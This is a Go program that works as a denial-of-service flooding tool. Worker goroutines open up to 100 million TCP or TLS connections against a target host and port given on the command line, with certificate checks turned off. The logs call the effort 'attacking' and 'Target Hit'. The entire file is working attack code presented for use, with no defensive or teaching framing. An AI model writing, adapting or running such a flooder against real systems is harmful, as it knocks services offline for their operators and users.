package main

import (
	"os"
	"log"
	str "strconv"
	"net"
	"fmt"
	"crypto/tls"
)

var (
	workers int
	target string
	port int
)

const (
	jobCount = 100_000_000  		// AMOUNT of requests to send. 
)

func init() {
	parseArgs(&workers, &target, &port)
}

func httpAttackWorker(workerID int, jobs chan int, result chan int) {
	switch port {
		case 80:
			for job := range jobs { 						
				address := target + ":" + str.Itoa(port)
				_, err := net.Dial("tcp", address)
		
				if err != nil {
					log.Printf("Worker: %d - Bad response from target! - %d \n", workerID, job)
					result <- 0
					continue
				}
		
				log.Printf("Worker: %d - Job:%d - Target Hit! \n", workerID, job)
				result <- 1 
			}
		case 443:
			config := &tls.Config{ InsecureSkipVerify: true, }

			for job := range jobs {
				address := target + ":" + str.Itoa(port)
				_, err := tls.Dial("tcp", address, config)	

				if err != nil {
					log.Printf("Worker: %d - Bad response from target! - %d \n", workerID, job)
					result <- 0
					continue
				}
		
				log.Printf("Worker: %d - Job:%d - Target Hit! \n", workerID, job)
				result <- 1 
			}
		default:
			fmt.Println("Invalid port number entered.")
			os.Exit(1)
	}
}

func parseArgs(workers *int, target *string, port *int) {
	if len(os.Args) < 4 {
		log.Println("Not enough parameters passed. ")
		fmt.Println("Usage: go run main.go <threads> <target> <port>")
		os.Exit(1)
	}

	if _, err := str.Atoi(os.Args[1]); err != nil {
		log.Println("Thread must be a number")
		fmt.Println("Usage: go run main.go <threads> <target> <port>")
		os.Exit(1)
	}

	if _, err := str.Atoi(os.Args[3]); err != nil {
		log.Println("Port must be a number")
		fmt.Println("Usage: go run main.go <threads> <target> <port>")
		os.Exit(1)
	}

	// On succesful conversion, set worker count
	*workers,_	= str.Atoi(os.Args[1])
	*target 	= os.Args[2]
    *port,_ 	= str.Atoi(os.Args[3])
}

func sendJobsToWorkers(jobCount int, jobs chan int){
	for j := 0; j <= jobCount; j++ {
		jobs <- j
	} 
	log.Println("Jobs placed in buff3r.")
	close(jobs) 	
}

func startWorkers(workers int, jobs, results chan int) {
	for  w := 1; w < workers; w++ { 			
		go httpAttackWorker(w, jobs, results)
	} 
}

func main() {
	jobs 	:= make(chan int, jobCount) 
	results := make(chan int, jobCount)  				

	go startWorkers(workers, jobs, results)
    go sendJobsToWorkers(jobCount, jobs)
	
	// - Blocks till jobs finished. 
	for r := 1; r < jobCount; r++ {
		<-results	
	} 
	
	close(results)
	log.Println("Finished attacking. Workers put to sleep... ")
}